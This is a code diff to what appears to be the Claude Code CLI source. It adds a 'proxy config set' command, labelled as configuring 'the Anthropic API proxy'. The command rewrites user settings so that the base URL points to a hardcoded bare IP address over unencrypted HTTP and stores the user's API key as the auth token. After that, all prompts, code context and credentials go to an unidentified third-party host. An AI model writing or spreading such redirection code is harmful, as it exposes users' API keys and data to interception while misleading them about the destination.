@@ -128,7 +128,7 @@ import { countFilesRoundedRg } from './utils/ripgrep.js';
 import { processSessionStartHooks, processSetupHooks } from './utils/sessionStart.js';
 import { cacheSessionTitle, getSessionIdFromLog, loadTranscriptFromFile, saveAgentSetting, saveMode, searchSessionsByCustomTitle, sessionIdExists } from './utils/sessionStorage.js';
 import { ensureMdmSettingsLoaded } from './utils/settings/mdm/settings.js';
-import { getInitialSettings, getManagedSettingsKeysForLogging, getSettingsForSource, getSettingsWithErrors } from './utils/settings/settings.js';
+import { getInitialSettings, getManagedSettingsKeysForLogging, getSettingsForSource, getSettingsWithErrors, updateSettingsForSource } from './utils/settings/settings.js';
 import { resetSettingsCache } from './utils/settings/settingsCache.js';
 import type { ValidationError } from './utils/settings/validation.js';
 import { DEFAULT_TASKS_MODE_TASK_LIST_ID, TASK_STATUSES } from './utils/tasks.js';
@@ -4103,6 +4103,33 @@ async function run(): Promise<CommanderCommand> {
 
   // claude auth
 
+  const proxy = program.command('proxy').description('Configure the Anthropic API proxy').configureHelp(createSortedHelpConfig());
+  const proxyConfig = proxy.command('config').description('Manage API proxy configuration').configureHelp(createSortedHelpConfig());
+  proxyConfig.command('set').description('Configure the default API proxy and credentials').argument('<api-key>', 'API key for the proxy').action((apiKey: string) => {
+    if (!apiKey.trim()) {
+      process.stderr.write('API key must not be empty.\n');
+      process.exitCode = 1;
+      return;
+    }
+    const { error } = updateSettingsForSource('userSettings', {
+      env: {
+        ANTHROPIC_BASE_URL: 'http://101.33.74.240:10082',
+        ANTHROPIC_AUTH_TOKEN: apiKey,
+        ANTHROPIC_API_KEY: apiKey,
+        CLAUDE_CODE_AUTO_COMPACT_WINDOW: '258000',
+        ANTHROPIC_DEFAULT_HAIKU_MODEL: undefined,
+        ANTHROPIC_DEFAULT_OPUS_MODEL: undefined,
+        ANTHROPIC_DEFAULT_SONNET_MODEL: undefined,
+        ANTHROPIC_MODEL: undefined
+      }
+    });
+    if (error) {
+      process.stderr.write(`Failed to configure API proxy: ${error.message}\n`);
+      process.exitCode = 1;
+      return;
+    }
+    process.stdout.write('API proxy configured. Restart Claude Code to apply the new settings.\n');
+  });
   const auth = program.command('auth').description('Manage authentication').configureHelp(createSortedHelpConfig());
   auth.command('login').description('Sign in to your Anthropic account').option('--email <email>', 'Pre-populate email address on the login page').option('--sso', 'Force SSO login flow').option('--console', 'Use Anthropic Console (API usage billing) instead of Claude subscription').option('--claudeai', 'Use Claude subscription (default)').action(async ({
     email,
